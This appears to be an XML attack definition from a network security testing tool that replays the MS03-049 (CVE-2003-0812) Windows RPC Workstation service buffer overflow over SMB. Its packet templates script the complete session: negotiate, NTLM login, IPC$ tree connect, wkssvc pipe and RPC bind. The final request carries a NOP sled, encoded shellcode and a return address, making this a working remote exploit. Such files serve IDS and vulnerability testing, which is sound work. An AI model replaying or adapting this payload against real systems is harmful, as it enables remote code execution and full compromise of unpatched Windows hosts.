<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="MS03-049 Buffer Overflow in RPC Logging Functions"/>
    <EngDesc display="true" value="This threat sends a large name in an attempt to get the Microsoft RPC service to overflow due to a bad string copy."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
    </Intent>
    <Protocol display="true" value="SMB"/>
    <Type_Of_Equipment display="true">
      <item value="Host"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Windows"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Windows_2000_SP4"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.eeye.com/html/research/advisories/AD20031111.html"/>
    <CVEID display="true" value="CVE-2003-0812"/>
    <bugtraqID display="true" value="9011"/>
    <OSVDB display="true" value="11461"/>
    <Author display="true" value="Chuck McAuley"/>
    <ID display="true" value="000001028dcd754000c000a80001003c591592e3"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632742200137500000"/>
    <SigStyle display="false" value="Matching"/>
    <targetNode display="false" value="U"/>
    <SigProtocol display="false" value="TCP"/>
    <Rate display="false" value="1"/>
    <Regex display="false" value="\X00\X00\X00\X23\XFF\X53\X4D\X42\X71\X00\X00\X00\X00\X18\X07\XC8\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\XFF\XFE\X00\X08\X80\X02\X00\X00\X00"/>
    <Created value="1139462260" display="false"/>
    <ServerSideAttack display="false" value="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="a"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="b"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="c"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="d"/>
    <NamedVar name="SMBdestPort" type="ImperfectControls.Port" value="null" index="e"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="C">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="E">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="G">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="I">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="K">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="M">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="O">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="Q">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="S">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
    <for index="U">
      <for index="a"/>
      <for index="b"/>
      <for index="c"/>
      <for index="d"/>
      <for index="e"/>
    </for>
  </Loops>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000085FF534D4272000000001853C80000000000000000000000000000FFFE00000000006200025043204E4554574F524B2050524F4752414D20312E3000024C414E4D414E312E30000257696E646F777320666F7220576F726B67726F75707320332E316100024C4D312E325830303200024C414E4D414E322E3100024E54204C4D20302E313200" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="C" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000000C2FF534D4273000000001807C80000000000000000000000000000FFFE000040000CFF00C20004413200000000000000200000000000D40000A087004E544C4D5353500001000000978208E00000000000000000000000000000000000570069006E0064006F007700730020003200300030003200200032003600300030002000530065007200760069006300650020005000610063006B00200031000000570069006E0064006F007700730020003200300030003200200035002E00310000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="E" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000102FF534D4273000000001807C80000000000000000000000000000FFFE000880000CFF00020104413200000000000000610000000000D40000A0C7004E544C4D5353500003000000010001005000000000000000510000000000000040000000000000004000000010001000400000001000100051000000158A88E04D004F004E0047004F004F0053004500007272D1E643120D764EF1B700BC632BAF570069006E0064006F007700730020003200300030003200200032003600300030002000530065007200760069006300650020005000610063006B00200031000000570069006E0064006F007700730020003200300030003200200035002E00310000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="G" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000060FF534D4275000000001807C80000000000000000000000000000FFFE0008C00004FF006000080001003500005C005C003100390032002E003100360038002E003100380030002E003100330030005C00490050004300240000003F3F3F3F3F00" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="I" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000064FF534D42A2000000001807C80000000000000000000000000008880B0008000118FF00DEDE000E0016000000000000009F01020000000000000000000000000003000000010000004000400002000000011100005C0077006B0073007300760063000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="K" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000088FF534D422F000000001807C80000000000000000000000000008FFFE000840010EFF00DEDE004000000000FFFFFFFF08004800000048004000000000004900EE05000B03100000004800000001000000B810B81000000000010000000000010098D0FF6B12A11036983346C3F87E345A01000000045D888AEB1CC9119FE808002B10486002000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="M" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0000003BFF534D422E000000001807C80000000000000000000000000008FFFE000880010CFF00DEDE00400000000000040004FFFFFFFF0004000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="O" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000008C2FF534D4225000000001807C80000000000000000000000000008880B0008C0011000006E080000000400000000000000000000000054006E0854000200260000407F08005C0050004900500045005C000000000005000003100000006E0800000100000056080000000019003CA240001200000000000000120000005C005C003100390032002E003100360038002E003100380030002E00310033003000000006040000000000000604000090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090906681EC0407909090909090909090909090EB195E31C981E9A6FFFFFF813676AC7C2581EEFCFFFFFFE2F2EB05E8E2FFFFFF9E947C2576EF3161764B05E30F4935A33F08D10B9F086655B17575D0DB6791D94D22322B9AD2A4C70501A520B8DE829660FB2F17299F4E0B32E0302577F728AC932521251C9C2541FDADF7657A270C39DB27242D9DA0F1725AFD2EDAA625BF7C9DBC162D28AD924F7CF5F758762C852302482D768998F3CDE6AC7C252F2578AB94474DDA102D90B577F8142477AC7CDA238C2B7221FB3B7231FB83706A25BF1489FB2B4D74AC6996FF4A163520FF83706EFB2FDA23B82B7325532935FF6E1AA49AF87CA84A884DE51CB925D6DD25ABE332886C6188E85818FFD0586DFFD05869FFD05875FBE8583522FC2D7427ED2D6C27FD835076FD837046259D4D895383DA899D83705AFB83707A53290D25F92A72FDC0583DFDE940AE22A904249C27363DFDF65C249D4F4E6CFD98F724989D83D9476CD01D96D87BE4B9A17DE29D5E475952B809C4FDF658249DCAF7293D2726397747F721FDAD94CE749DBCAC9CF322782D6E7425909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909063EEFD74909090909090909090909090E96FFDFFFF00909090909090909090C0FF1200AD1240000100000000000000000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="Q" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000029FF534D4204000000001807C80000000000000000000000000008FFFE00080002030040FFFFFFFF0000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="S" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000027FF534D4274000000001807C80000000000000000000000000000FFFE0008400202FF0000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="U" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000023FF534D4271000000001807C80000000000000000000000000008FFFE00088002000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
</threatSignature>
